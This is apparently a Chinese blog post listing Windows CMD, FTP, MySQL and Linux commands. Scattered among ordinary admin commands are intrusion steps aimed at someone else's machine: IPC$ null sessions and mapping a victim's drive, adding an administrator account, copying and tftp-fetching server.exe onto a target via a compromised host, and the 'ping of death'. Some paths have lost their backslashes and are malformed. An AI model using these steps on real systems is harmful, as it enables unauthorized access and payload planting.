resumetelnet.exe IP　帐号　密码 用Telnet连接完对方后，就用这个命令将对方的Telnet设置还原，并同时关闭Telnet服务。\n\n　　FTP命令详解\n\n　　FTP命令是Internet用户使用最频繁的命令之一，熟悉并灵活应用FTP的内部命令，可以大大方便使用者，并收到事半功倍之效。如果你想学习使用进行后台FTP下载，那么就必须学习FTP指令。\n\n　　FTP的命令行格式为：\n\n　　ftp -v -d -i -n -g [主机名] ，其中\n\n　　-v 显示远程服务器的所有响应信息\n\n　　-n 限制ftp的自动登录，即不使用；.n etrc文件；\n\n　　-d 使用调试方式；\n\n　　-g 取消全局文件名。\n\n　　FTP使用的内部命令如下(中括号表示可选项):\n\n　　1.![cmd[args]]：在本地机中执行交互shell，exit回到ftp环境，如：!ls*.zip\n\n　　2.$ macro-ame[args]： 执行宏定义macro-name。\n\n　　3.account[password]： 提供登录远程系统成功后访问系统资源所需的补充口令。\n\n　　4.append local-file[remote-file]：将本地文件追加到远程系统主机，若未指定远程系统文件名，则使用本地文件名。\n\n　　5.ascii：使用ascii类型传输方式。\n\n　　6.bell：每个命令执行完毕后计算机响铃一次。\n\n　　7.bin：使用二进制文件传输方式。\n\n　　8.bye：退出ftp会话过程。\n\n　　9.case：在使用mget时，将远程主机文件名中的大写转为小写字母。\n\n　　10. cd remote-dir：进入远程主机目录。\n\n　　11.cdup：进入远程主机目录的父目录。\n\n　　12.chmod mode file-name：将远程主机文件file-name的存取方式设置为mode，如：chmod 777 a.out。\n\n　　13.close：中断与远程服务器的ftp会话(与open对应)。\n\n　　14 .cr：使用asscii方式传输文件时，将回车换行转换为回行。\n\n　　15.delete remote-file：删除远程主机文件。\n\n　　16.debug[debug-value]：设置调试方式， 显示发送至远程主机的每条命令，如：deb up 3，若设为0，表示取消debug。\n\n　　17.dir[remote-dir][local-file]：显示远程主机目录，并将结果存入本地文件。\n\n　　18.disconnection：同close。\n\n　　19.form format：将文件传输方式设置为format，缺省为file方式。\n\n　　20.get remote-file[local-file]： 将远程主机的文件remote-file传至本地硬盘的local-file。\n\n　　21.glob：设置mdelete，mget，mput的文件名扩展，缺省时不扩展文件名，同命令行的-g参数。\n\n　　22.hash：每传输1024字节，显示一个hash符号(#)。\n\n　　23.help[cmd]：显示ftp内部命令cmd的帮助信息，如：help get。\n\n　　24.idle[seconds]：将远程服务器的休眠计时器设为[seconds]秒。\n\n　　25.image：设置二进制传输方式(同binary)。\n\n　　26.lcd[dir]：将本地工作目录切换至dir。\n\n　　27. ls[remote-dir][local-file]：显示远程目录remote-dir， 并存入本地文件local-file。\n\n　　28.macdef macro-name：定义一个宏，遇到macdef下的空行时，宏定义结束。\n\n　　29.mdelete[remote-file]：删除远程主机文件。\n\n　　30.mdir remote-files local-file：与dir类似，但可指定多个远程文件，如 ：mdir *.o.*.zipoutfile 。\n\n　　31.mget remote-files：传输多个远程文件。\n\n　　32.mkdir dir-name：在远程主机中建一目录。\n\n　　33.mls remote-file local-file：同nlist，但可指定多个文件名。\n\n　　34.mode[modename]：将文件传输方式设置为modename， 缺省为stream方式。\n\n　　35.modtime file-name：显示远程主机文件的最后修改时间。\n\n　　36.mput local-file：将多个文件传输至远程主机。\n\n　　37.newer file-name： 如果远程机中file-name的修改时间比本地硬盘同名文件的时间更近，则重传该文件。\n\n　　38.nlist[remote-dir][local-file]：显示远程主机目录的文件清单，并存入本地硬盘的local-file。\n\n　　39.nmap[inpattern outpattern]：设置文件名映射机制， 使得文件传输时，文件中的某些字符相互转换， 如：nmap $1.$2.$3[$1，$2].[$2，$3]，则传输文件a1.a2.a3时，文件名变为a1，a2。 该命令特别适用于远程主机为非UNIX机的情况。\n\n　　40.ntrans[inchars[outchars]]：设置文件名字符的翻译机制，如ntrans1R，则文件名LLL将变为RRR。\n\n　　41.open host[port]：建立指定ftp服务器连接，可指定连接端口。\n\n　　42.passive：进入被动传输方式。\n\n　　43.prompt：设置多个文件传输时的交互提示。\n\n　　44.proxy ftp-cmd：在次要控制连接中，执行一条ftp命令， 该命令允许连接两个ftp服务器，以在两个服务器间传输文件。第一条ftp命令必须为open，以首先建立两个服务器间的连接。\n\n　　45.put local-file[remote-file]：将本地文件local-file传送至远程主机。\n\n　　46.pwd：显示远程主机的当前工作目录。\n\n　　47.quit：同bye，退出ftp会话。\n\n　　48.quote arg1，arg2...：将参数逐字发至远程ftp服务器，如：quote syst.\n\n　　49.recv remote-file[local-file]：同get。\n\n　　50.reget remote-file[local-file]：类似于get， 但若local-file存在，则从上次传输中断处续传。\n\n　　51.rhelp[cmd-name]：请求获得远程主机的帮助。\n\n　　52.rstatus[file-name]：若未指定文件名，则显示远程主机的状态， 否则显示文件状态。\n\n　　53.rename[from][to]：更改远程主机文件名。\n\n　　54.reset：清除回答队列。\n\n　　55.restart marker：从指定的标志marker处，重新开始get或put，如：restart 130。\n\n　　56.rmdir dir-name：删除远程主机目录。\n\n　　57.runique：设置文件名只一性存储，若文件存在，则在原文件后加后缀.1， .2等。\n\n　　58.send local-file[remote-file]：同put。\n\n　　59.sendport：设置PORT命令的使用。\n\n　　60.site arg1，arg2...：将参数作为SITE命令逐字发送至远程ftp主机。\n\n　　61.size file-name：显示远程主机文件大小，如：site idle 7200。\n\n　　62.status：显示当前ftp状态。\n\n　　63.struct[struct-name]：将文件传输结构设置为struct-name， 缺省时使用stream结构。\n\n　　64.sunique：将远程主机文件名存储设置为只一(与runique对应)。\n\n　　65.system：显示远程主机的操作系统类型。\n\n　　66.tenex：将文件传输类型设置为TENEX机的所需的类型。\n\n　　67.tick：设置传输时的字节计数器。\n\n　　68.trace：设置包跟踪。\n\n　　69.type[type-name]：设置文件传输类型为type-name，缺省为ascii，如:type binary，设置二进制传输方式。\n\n　　70.umask[newmask]：将远程服务器的缺省umask设置为newmask，如：umask 3\n\n　　71.user user-name[password][account]：向远程主机表明自己的身份，需要口令时，必须输入口令，如：user anonymous my@email。\n\n　　72.verbose：同命令行的-v参数，即设置详尽报告方式，ftp 服务器的所有响 应都将显示给用户，缺省为on.\n\n　　73.?[cmd]：同help.","slug":"Tools/Windows命令","published":1,"updated":"2020-07-06T01:48:06.527Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckfvz8cyc00112gk7d6wx4rma","content":"<p>运行操作</p>\n<p>CMD命令：开始－&gt;运行－&gt;键入cmd或command(在命令行里可以看到系统版本、文件系统版本)</p>\n<p>CMD命令锦集</p>\n<ol>\n<li>gpedit.msc—–组策略</li>\n</ol>\n<p>　　2. sndrec32——-录音机</p>\n<p>　　3. Nslookup——-IP地址侦测器 ，是一个 监测网络中 DNS 服务器是否能正确实现域名解析的命令行工具。 它在 Windows NT/2000/XP 中均可使用 , 但在 Windows 98 中却没有集成这一个工具。</p>\n<p>　　4. explorer——-打开资源管理器</p>\n<p>　　5. logoff———注销命令</p>\n<p>　　6. shutdown——-60秒倒计时关机命令</p>\n<p>　　7. lusrmgr.msc—-本机用户和组</p>\n<p>　　8. services.msc—本地服务设置</p>\n<p>　　9. oobe/msoobe /a—-检查XP是否激活</p>\n<p>　　10. notepad——–打开记事本</p>\n<p>　　11. cleanmgr——-垃圾整理</p>\n<p>　　12. net start messenger—-开始信使服务</p>\n<p>　　13. compmgmt.msc—计算机管理</p>\n<p>　　14. net stop messenger—–停止信使服务</p>\n<p>　　15. conf———–启动netmeeting</p>\n<p>　　16. dvdplay——–DVD播放器</p>\n<p>　　17. charmap——–启动字符映射表</p>\n<p>　　18. diskmgmt.msc—磁盘管理实用程序</p>\n<p>　　19. calc———–启动计算器</p>\n<p>　　20. dfrg.msc——-磁盘碎片整理程序</p>\n<p>　　21. chkdsk.exe—–Chkdsk磁盘检查</p>\n<p>　　22. devmgmt.msc— 设备管理器</p>\n<p>　　23. regsvr32 /u *.dll—-停止dll文件运行</p>\n<p>　　24. drwtsn32—— 系统医生</p>\n<p>　　25. rononce -p—-15秒关机</p>\n<p>　　26. dxdiag———检查DirectX信息</p>\n<p>　　27. regedt32——-注册表编辑器</p>\n<p>　　28. Msconfig.exe—系统配置实用程序</p>\n<p>　　29. rsop.msc——-组策略结果集</p>\n<p>　　30. mem.exe——–显示内存使用情况</p>\n<p>　　31. regedit.exe—-注册表</p>\n<p>　　32. winchat——–XP自带局域网聊天</p>\n<p>　　33. progman——–程序管理器</p>\n<p>　　34. winmsd———系统信息</p>\n<p>　　35. perfmon.msc—-计算机性能监测程序</p>\n<p>　　36. winver———检查Windows版本</p>\n<p>　　37. sfc /scannow—–扫描错误并复原</p>\n<p>　　38. taskmgr—–任务管理器（2000/xp/2003</p>\n<p>　　40. wmimgmt.msc—-打开windows管理体系结构(WMI)</p>\n<p>　　41. wupdmgr——–windows更新程序</p>\n<p>　　42. wscript——–windows脚本宿主设置</p>\n<p>　　43. write———-写字板</p>\n<p>　　45. wiaacmgr——-扫描仪和照相机向导</p>\n<p>　　46. winchat——–XP自带局域网聊天</p>\n<p>　　49. mplayer2——-简易widnows media player</p>\n<p>　　50. mspaint——–画图板</p>\n<p>　　51. mstsc———-远程桌面连接</p>\n<p>　　53. magnify——–放大镜实用程序</p>\n<p>　　54. mmc————打开控制台</p>\n<p>　　55. mobsync——–同步命令</p>\n<p>　　57. iexpress——-木马捆绑工具，系统自带</p>\n<p>　　58. fsmgmt.msc—–共享文件夹管理器</p>\n<p>　　59. utilman——–辅助工具管理器</p>\n<p>　　61. dcomcnfg——-打开系统组件服务</p>\n<p>　　62. ddeshare——-打开DDE共享设置</p>\n<p>　　110. osk————打开屏幕键盘</p>\n<p>　　111. odbcad32——-ODBC数据源管理器</p>\n<p>　　112. oobe/msoobe /a—-检查XP是否激活</p>\n<p>　　68. ntbackup——-系统备份和还原</p>\n<p>　　69. narrator——-屏幕“讲述人”</p>\n<p>　　70. ntmsmgr.msc—-移动存储管理器</p>\n<p>　　71. ntmsoprq.msc—移动存储管理员操作请求</p>\n<p>　　72. netstat -an—-(TC)命令检查接口</p>\n<p>　　73. syncapp——–创建一个公文包</p>\n<p>　　74. sysedit——–系统配置编辑器</p>\n<p>　　75. sigverif——-文件签名验证程序</p>\n<p>　　76. ciadv.msc——索引服务程序</p>\n<p>　　77. shrpubw——–创建共享文件夹</p>\n<p>　　78. secpol.msc—–本地安全策略</p>\n<p>　　79. syskey———系统加密，一旦加密就不能解开，保护windows xp系统的双重密码</p>\n<p>　　80. services.msc—本地服务设置</p>\n<p>　　81. Sndvol32——-音量控制程序</p>\n<p>　　82. sfc.exe——–系统文件检查器</p>\n<p>　　83. sfc /scannow—windows文件保护</p>\n<p>　　84. ciadv.msc——索引服务程序</p>\n<p>　　85. tourstart——xp简介（安装完成后出现的漫游xp程序）</p>\n<p>　　86. taskmgr——–任务管理器</p>\n<p>　　87. eventvwr——-事件查看器</p>\n<p>　　88. eudcedit——-造字程序</p>\n<p>　　89. compmgmt.msc—计算机管理</p>\n<p>　　90. packager——-对象包装程序</p>\n<p>　　91. perfmon.msc—-计算机性能监测程序</p>\n<p>　　92. charmap——–启动字符映射表</p>\n<p>　　93. cliconfg——-SQL SERVER 客户端网络实用程序</p>\n<p>　　94. Clipbrd——–剪贴板查看器</p>\n<p>　　95. conf———–启动netmeeting</p>\n<p>　　96. certmgr.msc—-证书管理实用程序</p>\n<p>　　97. regsvr32 /u *.dll—-停止dll文件运行</p>\n<p>　　98. regsvr32 /u zipfldr.dll——取消ZIP支持</p>\n<p>　　99. cmd.exe——–CMD命令提示符</p>\n<p>操作详解　　</p>\n<p>net use ipipc$ “ “ /user:” “ 建立IPC空链接</p>\n<p>　　net use ipipc$ “密码” /user:”用户名” 建立IPC非空链接</p>\n<p>　　net use h: ipc$ “密码” /user:”用户名” 直接登陆后映射对方C：到本地为H:</p>\n<p>　　net use h: ipc$ 登陆后映射对方C：到本地为H:</p>\n<p>　　net use ipipc$ /del 删除IPC链接</p>\n<p>　　net use h: /del 删除映射对方到本地的为H:的映射</p>\n<p>　　net user 用户名　密码　/add 建立用户</p>\n<p>　　net user guest /active:yes 激活guest用户</p>\n<p>　　net user 查看有哪些用户</p>\n<p>　　net user 帐户名 查看帐户的属性</p>\n<p>　　net localgroup administrators 用户名 /add 把“用户”添加到管理员中使其具有管理员权限</p>\n<p>　　net start 查看开启了哪些服务</p>\n<p>　　net start 服务名　开启服务；(如:net start telnet， net start schedule)</p>\n<p>　　net stop 服务名 停止某服务</p>\n<p>　　net time 目标ip 查看对方时间</p>\n<p>　　net time 目标ip /set 设置本地计算机时间与“目标IP”主机的时间同步,加上参数/yes可取消确认信息</p>\n<p>　　net view 查看本地局域网内开启了哪些共享</p>\n<p>　　net view ip 查看对方局域网内开启了哪些共享</p>\n<p>　　net config 显示系统网络设置</p>\n<p>　　net logoff 断开连接的共享</p>\n<p>　　net pause 服务名 暂停某服务</p>\n<p>　　net send ip “文本信息” 向对方发信息</p>\n<p>　　net ver 局域网内正在使用的网络连接类型和信息</p>\n<p>　　net share 查看本地开启的共享</p>\n<p>　　net share ipc$ 开启ipc$共享</p>\n<p>　　net share ipc$ /del 删除ipc$共享</p>\n<p>　　net share c$ /del 删除C：共享</p>\n<p>　　net user guest 12345 用guest用户登陆后用将密码改为12345</p>\n<p>　　net password 密码 更改系统登陆密码</p>\n<p>　　netstat -a 查看开启了哪些端口,常用netstat -an</p>\n<p>　　netstat -n 查看端口的网络连接情况，常用netstat -an</p>\n<p>　　netstat -v 查看正在进行的工作</p>\n<p>　　netstat -p 协议名 例：netstat -p tcq/ip 查看某协议使用情况</p>\n<p>　　netstat -s 查看正在使用的所有协议使用情况</p>\n<p>　　nbtstat -A ip 对方136到139其中一个端口开了的话，就可查看对方最近登陆的用户名</p>\n<p>　　tracert -参数 ip(或计算机名) 跟踪路由（数据包），参数：“-w数字”用于设置超时间隔。</p>\n<p>　　ping ip(或域名) 向对方主机发送默认大小为32字节的数据，参数：“-l[空格]数据包大小”；“-n发送数据次数”；“-t”指一直ping。</p>\n<p>　　ping -t -l 65550 ip 死亡之ping(发送大于64K的文件并一直ping就成了死亡之ping)</p>\n<p>　　ipconfig (winipcfg) 用于windows NT及XP(windows 95 98)查看本地ip地址，ipconfig可用参数“/all”显示全部配置信息</p>\n<p>　　tlist -t 以树行列表显示进程(为系统的附加工具，默认是没有安装的，在安装目录的Support/tools文件夹内)</p>\n<p>　　kill -F 进程名 加-F参数后强制结束某进程(为系统的附加工具，默认是没有安装的，在安装目录的Support/tools文件夹内)</p>\n<p>　　del -F 文件名 加-F参数后就可删除只读文件,/AR、/AH、/AS、/AA分别表示删除只读、隐藏、系统、存档文件，/A-R、/A-H、/A-S、/A-A表示删除除只读、隐藏、系统、存档以外的文件。例如“DEL/AR <em>.</em>”表示删除当前目录下所有只读文件，“DEL/A-S <em>.</em>”表示删除当前目录下除系统文件以外的所有文件</p>\n<p>　　del /S /Q 目录 或用：rmdir /s /Q 目录 /S删除目录及目录下的所有子目录和文件。同时使用参数/Q 可取消删除操作时的系统确认就直接删除。（二个命令作用相同）</p>\n<p>　　move 盘符路径要移动的文件名　存放移动文件的路径移动后文件名 移动文件,用参数/y将取消确认移动目录存在相同文件的提示就直接覆盖</p>\n<p>　　fc one.txt two.txt &gt; 3st.txt 对比二个文件并把不同之处输出到3st.txt文件中，”&gt; “和”&gt; &gt;” 是重定向命令</p>\n<p>　　at id号 开启已注册的某个计划任务</p>\n<p>　　at /delete 停止所有计划任务，用参数/yes则不需要确认就直接停止</p>\n<p>　　at id号 /delete 停止某个已注册的计划任务</p>\n<p>　　at 查看所有的计划任务</p>\n<p>　　at ip time 程序名(或一个命令) /r 在某时间运行对方某程序并重新启动计算机</p>\n<p>　　finger username @host 查看最近有哪些用户登陆</p>\n<p>　　telnet ip 端口 远和登陆服务器,默认端口为23</p>\n<p>　　open ip 连接到IP（属telnet登陆后的命令）</p>\n<p>　　telnet 在本机上直接键入telnet 将进入本机的telnet</p>\n<p>　　copy 路径文件名1　路径文件名2 /y 复制文件1到指定的目录为文件2，用参数/y就同时取消确认你要改写一份现存目录文件</p>\n<p>　　copy c:srv.exe ipadmin$ 复制本地c:srv.exe到对方的admin下</p>\n<p>　　copy 1st.jpg/b+2st.txt/a 3st.jpg 将2st.txt的内容藏身到1st.jpg中生成3st.jpg新的文件，注：2st.txt文件头要空三排，参数：/b指二进制文件，/a指ASCLL格式文件</p>\n<p>　　copy ipadmin$svv.exe c: 或:copyipadmin$<em>.</em> 复制对方admini$共享下的srv.exe文件（所有文件）至本地C：</p>\n<p>　　xcopy 要复制的文件或目录树　目标地址目录名 复制文件和目录树，用参数/Y将不提示覆盖相同文件</p>\n<p>　　用参数/e才可连目录下的子目录一起复制到目标地址下。</p>\n<p>　　tftp -i 自己IP(用肉机作跳板时这用肉机IP) get server.exe c:server.exe 登陆后，将“IP”的server.exe下载到目标主机c:server.exe 参数：-i指以二进制模式传送，如传送exe文件时用，如不加-i 则以ASCII模式（传送文本文件模式）进行传送</p>\n<p>　　tftp -i 对方IP　put c:server.exe 登陆后，上传本地c:server.exe至主机</p>\n<p>　　ftp ip 端口 用于上传文件至服务器或进行文件操作，默认端口为21。bin指用二进制方式传送（可执行文件进）；默认为ASCII格式传送(文本文件时)</p>\n<p>　　route print 显示出IP路由，将主要显示网络地址Network addres，子网掩码Netmask，网关地址Gateway addres，接口地址Interface</p>\n<p>　　arp 查看和处理ARP缓存，ARP是名字解析的意思，负责把一个IP解析成一个物理性的MAC地址。arp -a将显示出全部信息</p>\n<p>　　start 程序名或命令 /max 或/min 新开一个新窗口并最大化（最小化）运行某程序或命令</p>\n<p>　　mem 查看cpu使用情况</p>\n<p>　　attrib 文件名(目录名) 查看某文件（目录）的属性</p>\n<p>　　attrib 文件名 -A -R -S -H 或 +A +R +S +H 去掉(添加)某文件的 存档，只读，系统，隐藏 属性；用+则是添加为某属性</p>\n<p>　　dir 查看文件，参数：/Q显示文件及目录属系统哪个用户，/T:C显示文件创建时间，/T:A显示文件上次被访问时间，/T:W上次被修改时间</p>\n<p>　　date /t 、 time /t 使用此参数即“DATE/T”、“TIME/T”将只显示当前日期和时间，而不必输入新日期和时间</p>\n<p>　　set 指定环境变量名称=要指派给变量的字符 设置环境变量</p>\n<p>　　set 显示当前所有的环境变量</p>\n<p>　　set p(或其它字符) 显示出当前以字符p(或其它字符)开头的所有环境变量</p>\n<p>　　pause 暂停批处理程序，并显示出：请按任意键继续….</p>\n<p>　　if 在批处理程序中执行条件处理（更多说明见if命令及变量）</p>\n<p>　　goto 标签 将cmd.exe导向到批处理程序中带标签的行（标签必须单独一行，且以冒号打头，例如：“：start”标签）</p>\n<p>　　call 路径批处理文件名 从批处理程序中调用另一个批处理程序 （更多说明见call /?）</p>\n<p>　　for 对一组文件中的每一个文件执行某个特定命令（更多说明见for命令及变量）</p>\n<p>　　echo on或off 打开或关闭echo，仅用echo不加参数则显示当前echo设置</p>\n<p>　　echo 信息 在屏幕上显示出信息</p>\n<p>　　echo 信息 &gt;&gt; pass.txt 将”信息”保存到pass.txt文件中</p>\n<p>　　findstr “Hello” aa.txt 在aa.txt文件中寻找字符串hello</p>\n<p>　　find 文件名 查找某文件</p>\n<p>　　title 标题名字 更改CMD窗口标题名字</p>\n<p>　　color 颜色值 设置cmd控制台前景和背景颜色；0=黑、1=蓝、2=绿、3=浅绿、4=红、5=紫、6=黄、7=白、8=灰、9=淡蓝、A=淡绿、B=淡浅绿、C=淡红、D=淡紫、E=淡黄、F=亮白</p>\n<p>　　prompt 名称 更改cmd.exe的显示的命令提示符(把C:、D:统一改为：EntSky )</p>\n<p>　　ver 在DOS窗口下显示版本信息</p>\n<p>　　winver 弹出一个窗口显示版本信息（内存大小、系统版本、补丁版本、计算机名）</p>\n<p>　　format 盘符 /FS:类型 格式化磁盘,类型:FAT、FAT32、NTFS ,例：Format D: /FS:NTFS</p>\n<p>　　md　目录名 创建目录</p>\n<p>　　replace 源文件　要替换文件的目录 替换文件</p>\n<p>　　ren 原文件名　新文件名 重命名文件名</p>\n<p>　　tree 以树形结构显示出目录，用参数-f 将列出第个文件夹中文件名称</p>\n<p>　　type 文件名 显示文本文件的内容</p>\n<p>　　more 文件名 逐屏显示输出文件</p>\n<p>　　doskey 要锁定的命令=字符</p>\n<p>　　doskey 要解锁命令= 为DOS提供的锁定命令(编辑命令行，重新调用win2k命令，并创建宏)。如：锁定dir命令：doskey dir=entsky (不能用doskey dir=dir)；解锁：doskey dir=</p>\n<p>　　taskmgr 调出任务管理器</p>\n<p>　　chkdsk /F D: 检查磁盘D并显示状态报告；加参数/f并修复磁盘上的错误</p>\n<p>　　tlntadmn telnt服务admn,键入tlntadmn选择3，再选择8,就可以更改telnet服务默认端口23为其它任何端口</p>\n<p>　　exit 退出cmd.exe程序或目前，用参数/B则是退出当前批处理脚本而不是cmd.exe</p>\n<p>　　path 路径可执行文件的文件名 为可执行文件设置一个路径。</p>\n<p>　　cmd 启动一个win2K命令解释窗口。参数：/eff、/en 关闭、开启命令扩展；更我详细说明见cmd /?</p>\n<p>　　regedit /s 注册表文件名 导入注册表；参数/S指安静模式导入，无任何提示；</p>\n<p>　　regedit /e 注册表文件名 导出注册表</p>\n<p>　　cacls 文件名　参数 显示或修改文件访问控制列表（ACL）——针对NTFS格式时。参数：/D 用户名:设定拒绝某用户访问；/P 用户名:perm 替换指定用户的访问权限；/G 用户名:perm 赋予指定用户访问权限；Perm 可以是: N 无，R 读取， W 写入， C 更改(写入)，F 完全控制；例：cacls D: est.txt /D pub 设定d: est.txt拒绝pub用户访问。</p>\n<p>　　cacls 文件名 查看文件的访问用户权限列表</p>\n<p>　　REM 文本内容 在批处理文件中添加注解</p>\n<p>　　netsh 查看或更改本地网络配置情况</p>\n<p>　　IIS服务命令</p>\n<p>　　iisreset /reboot 重启win2k计算机（但有提示系统将重启信息出现）</p>\n<p>　　iisreset /start或stop 启动（停止）所有Internet服务</p>\n<p>　　iisreset /restart 停止然后重新启动所有Internet服务</p>\n<p>　　iisreset /status 显示所有Internet服务状态</p>\n<p>　　iisreset /enable或disable 在本地系统上启用（禁用）Internet服务的重新启动</p>\n<p>　　iisreset /rebootonerror 当启动、停止或重新启动Internet服务时，若发生错误将重新开机</p>\n<p>　　iisreset /noforce 若无法停止Internet服务，将不会强制终止Internet服务</p>\n<p>　　iisreset /timeout Val在到达逾时间（秒）时，仍未停止Internet服务，若指定/rebootonerror参数，则电脑将会重新开机。预设值为重新启动20秒，停止60秒，重新开机0秒。</p>\n<p>　　FTP 命令： (后面有详细说明内容)</p>\n<p>　　ftp的命令行格式为:</p>\n<p>　　ftp －v －d －i －n －g[主机名] －v 显示远程服务器的所有响应信息。</p>\n<p>　　－d 使用调试方式。</p>\n<p>　　－n 限制ftp的自动登录,即不使用.netrc文件。</p>\n<p>　　－g 取消全局文件名。</p>\n<p>　　help [命令] 或 ？[命令] 查看命令说明</p>\n<p>　　bye 或 quit 终止主机FTP进程,并退出FTP管理方式.</p>\n<p>　　pwd 列出当前远端主机目录</p>\n<p>　　put 或 send 本地文件名 [上传到主机上的文件名] 将本地一个文件传送至远端主机中</p>\n<p>　　get 或 recv [远程主机文件名] [下载到本地后的文件名] 从远端主机中传送至本地主机中</p>\n<p>　　mget [remote-files] 从远端主机接收一批文件至本地主机</p>\n<p>　　mput local-files 将本地主机中一批文件传送至远端主机</p>\n<p>　　dir 或 ls [remote-directory] [local-file] 列出当前远端主机目录中的文件.如果有本地文件,就将结果写至本地文件</p>\n<p>　　ascii 设定以ASCII方式传送文件(缺省值)</p>\n<p>　　bin 或 image 设定以二进制方式传送文件</p>\n<p>　　bell 每完成一次文件传送,报警提示</p>\n<p>　　cdup 返回上一级目录</p>\n<p>　　close 中断与远程服务器的ftp会话(与open对应)</p>\n<p>　　open host[port] 建立指定ftp服务器连接,可指定连接端口</p>\n<p>　　delete 删除远端主机中的文件</p>\n<p>　　mdelete [remote-files] 删除一批文件</p>\n<p>　　mkdir directory-name 在远端主机中建立目录</p>\n<p>　　rename [from] [to] 改变远端主机中的文件名</p>\n<p>　　rmdir directory-name 删除远端主机中的目录</p>\n<p>　　status 显示当前FTP的状态</p>\n<p>　　system 显示远端主机系统类型</p>\n<p>　　user user-name [password] [account] 重新以别的用户名登录远端主机</p>\n<p>　　open host [port] 重新建立一个新的连接</p>\n<p>　　prompt 交互提示模式</p>\n<p>　　macdef 定义宏命令</p>\n<p>　　lcd 改变当前本地主机的工作目录,如果缺省,就转到当前用户的HOME目录</p>\n<p>　　chmod 改变远端主机的文件权限</p>\n<p>　　case 当为ON时,用MGET命令拷贝的文件名到本地机器中,全部转换为小写字母</p>\n<p>　　cd remote－dir 进入远程主机目录</p>\n<p>　　cdup 进入远程主机目录的父目录</p>\n<p>　　! 在本地机中执行交互shell，exit回到ftp环境,如!ls*.zip</p>\n<p>　　#5</p>\n<p>　　MYSQL 命令</p>\n<p>　　mysql -h主机地址 -u用户名 －p密码 连接MYSQL;如果刚安装好MYSQL，超级用户root是没有密码的。</p>\n<p>　　（例：mysql -h110.110.110.110 -Uroot -P123456</p>\n<p>　　注:u与root可以不用加空格，其它也一样）</p>\n<p>　　exit 退出MYSQL</p>\n<p>　　mysqladmin -u用户名 -p旧密码 password 新密码 修改密码</p>\n<p>　　grant select on 数据库.* to 用户名@登录主机 identified by “密码”; 增加新用户。（注意：和上面不同，下面的因为是MYSQL环境中的命令，所以后面都带一个分号作为命令结束符）</p>\n<p>　　show databases; 显示数据库列表。刚开始时才两个数据库：mysql和test。mysql库很重要它里面有MYSQL的系统信息，我们改密码和新增用户，实际上就是用这个库进行操作。</p>\n<p>　　use mysql；</p>\n<p>　　show tables; 显示库中的数据表</p>\n<p>　　describe 表名; 显示数据表的结构</p>\n<p>　　create database 库名; 建库</p>\n<p>　　use 库名；</p>\n<p>　　create table 表名 (字段设定列表)； 建表</p>\n<p>　　drop database 库名;</p>\n<p>　　drop table 表名； 删库和删表</p>\n<p>　　delete from 表名; 将表中记录清空</p>\n<p>　　select * from 表名; 显示表中的记录</p>\n<p>　　mysqldump –opt school&gt;school.bbb 备份数据库：（命令在DOS的mysqlin目录下执行）;注释:将数据库school备份到school.bbb文件，school.bbb是一个文本文件，文件名任取，打开看看你会有新发现。</p>\n<p>　　win2003系统下新增命令（实用部份）：</p>\n<p>　　shutdown /参数 关闭或重启本地或远程主机。</p>\n<p>　　参数说明：/S 关闭主机，/R 重启主机， /T 数字 设定延时的时间，范围0～180秒之间， /A取消开机，/M //IP 指定的远程主机。</p>\n<p>　　例：shutdown /r /t 0 立即重启本地主机（无延时）</p>\n<p>　　taskill /参数 进程名或进程的pid 终止一个或多个任务和进程。</p>\n<p>　　参数说明：/PID 要终止进程的pid,可用tasklist命令获得各进程的pid，/IM 要终止的进程的进程名，/F 强制终止进程，/T 终止指定的进程及他所启动的子进程。</p>\n<p>　　tasklist 显示当前运行在本地和远程主机上的进程、服务、服务各进程的进程标识符(PID)。</p>\n<p>　　参数说明：/M 列出当前进程加载的dll文件，/SVC 显示出每个进程对应的服务，无参数时就只列出当前的进程。</p>\n<p>　　Linux系统下基本命令　注：要区分大小写</p>\n<p>　　uname 显示版本信息（同win2K的 ver）</p>\n<p>　　dir 显示当前目录文件,ls -al 显示包括隐藏文件（同win2K的 dir）</p>\n<p>　　pwd 查询当前所在的目录位置</p>\n<p>　　cd cd　..回到上一层目录，注意cd 与..之间有空格。cd　/返回到根目录。</p>\n<p>　　cat 文件名 查看文件内容</p>\n<p>　　cat &gt;abc.txt 往abc.txt文件中写上内容。</p>\n<p>　　more 文件名 以一页一页的方式显示一个文本文件。</p>\n<p>　　cp 复制文件</p>\n<p>　　mv 移动文件</p>\n<p>　　rm 文件名 删除文件，rm -a 目录名删除目录及子目录</p>\n<p>　　mkdir 目录名 建立目录</p>\n<p>　　rmdir 删除子目录，目录内没有文档。</p>\n<p>　　chmod 设定档案或目录的存取权限</p>\n<p>　　grep 在档案中查找字符串</p>\n<p>　　diff 档案文件比较</p>\n<p>　　find 档案搜寻</p>\n<p>　　date 现在的日期、时间</p>\n<p>　　who 查询目前和你使用同一台机器的人以及Login时间地点</p>\n<p>　　w 查询目前上机者的详细资料</p>\n<p>　　whoami 查看自己的帐号名称</p>\n<p>　　groups 查看某人的Group</p>\n<p>　　passwd 更改密码</p>\n<p>　　history 查看自己下过的命令</p>\n<p>　　ps 显示进程状态</p>\n<p>　　kill 停止某进程</p>\n<p>　　gcc 黑客通常用它来编译C语言写的文件</p>\n<p>　　su 权限转换为指定使用者</p>\n<p>　　telnet IP telnet连接对方主机（同win2K），当出现bash$时就说明连接成功。</p>\n<p>　　ftp ftp连接上某服务器（同win2K）</p>\n<p>　　批处理命令与变量</p>\n<p>　　1：for命令及变量 基本格式</p>\n<p>　　FOR /参数 %variable IN (set) DO command [command_parameters] %variable:指定一个单一字母可替换的参数，如：%i ，而指定一个变量则用：%%i ，而调用变量时用：%i% ，变量是区分大小写的（%i 不等于 %I）。</p>\n<p>　　批处理每次能处理的变量从%0—%9共10个，其中%0默认给批处理文件名使用，%1默认为使用此批处理时输入的的第一个值，同理：%2—%9指输入的第2-9个值；例：net use ipipc$ pass /user:user 中ip为%1,pass为%2 ,user为%3</p>\n<p>　　(set):指定一个或一组文件，可使用通配符，如：(D:user.txt)和(1 1 254)(1 -1 254),{ “(1 1 254)”第一个”1”指起始值，第二个”1”指增长量，第三个”254”指结束值，即：从1到254；“(1 -1 254)”说明：即从254到1 }</p>\n<p>　　command：指定对第个文件执行的命令，如：net use命令；如要执行多个命令时，命令这间加：&amp; 来隔开</p>\n<p>　　command_parameters：为特定命令指定参数或命令行开关</p>\n<p>　　IN (set)：指在(set)中取值；DO command ：指执行command</p>\n<p>　　参数：/L 指用增量形式{ (set)为增量形式时 }；/F 指从文件中不断取值，直到取完为止{ (set)为文件时，如(d:pass.txt)时 